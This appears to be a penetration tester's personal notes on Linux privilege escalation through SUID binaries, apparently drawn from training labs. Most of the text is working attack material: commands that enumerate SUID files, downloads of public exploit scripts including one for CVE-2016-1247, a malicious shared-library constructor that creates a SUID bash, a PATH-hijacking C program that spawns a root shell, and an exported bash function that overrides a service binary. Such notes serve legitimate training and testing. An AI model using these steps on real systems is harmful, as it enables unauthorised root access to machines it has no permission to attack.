#### Detection

Files with SUID set run with higher privileges.  Can be found with "s"  on permissions.

-rws-rw-r--

Search for files that have SUID set:
```
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} + 2>/dev/null | awk '$NF !~ /\/(bin|sbin|usr\/bin|usr\/sbin|lib|lib64|dev|opt)\// {print "\033[1;31m[!] Suspicious SUID/SGID:\033[0m", $0} $NF ~ /\/(bin|sbin|usr\/bin|usr\/sbin|lib|lib64|dev|opt)\// {print "[+] Normal:", $0}'
```


```bash - kali
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
OR
```bash - kali
find / -perm -u=s -type f 2>/dev/null
```


#### suid3num.py

https://gtfobins.github.io/#+suid

```bash - kali
wget https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py
```

![[Python#Server]]

```bash - kali
python suid3num.py
```

#### Shared Objection injection
```bash - kali
find / -type f -perm -04000 -ls 2>/dev/null
```


```bash - kali
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

The idea here is to find where we have write privileges, overwrite one of these files with our malicious code.  In this example, that file is /home/user/.config/libcalc.so


libcalc.c
```c - kali
#include <stdio.h>
#include <stdlib.h>


static void inject() __attribute__((constructor));

void inject () {
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Verify the output path actually exists.  If not, make it.
Example /home/user/.config

```bash - kali
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c
```

Now just run the original bin:

```bash - kali
/usr/local/bin/suid-so
```

#### CVE-2016-1247 Binary Symlinks
![[3._Automated Tools#Linux Exploit Suggester]]

See if the target has unpatched version of nginx:

```bash - target
dpkg -l | grep nginx
```

```bash - kali
wget https://raw.githubusercontent.com/xl7dev/Exploit/master/Nginx/nginxed-root.sh
```

![[Python#Server]]

```bash - kali
./nginxed-root.sh /var/log/nginx/error.log
```

Logs must be rotated before exploit works.


#### Environmental Variables (Example 1)
```bash - kali
env
```

```bash - kali
find / -type f -perm -04000 -ls 2>/dev/null
```

/usr/local/bin/suid-env

```bash - kali
strings /usr/local/bin/suid-env
```

We see at the bottom it is trying to start Apache by using the service binary.  We will create a malicious service binary.

```bash - kali
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
```

```bash - kali
gcc /tmp/service.c -o /tmp/service
```

```bash - kali
export PATH=/tmp:$PATH
```

Notice now, that /tmp is first on the list when it looks for binary's.

```bash - kali
/usr/local/bin/suid-env
```

#### Environmental Variables (Example 2)

```bash - kali
strings /usr/local/bin/suid-env2
```

This one uses services located in /usr/sbin/service.  

```bash - kali
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
```

```bash - kali
export -f /usr/sbin/service
```

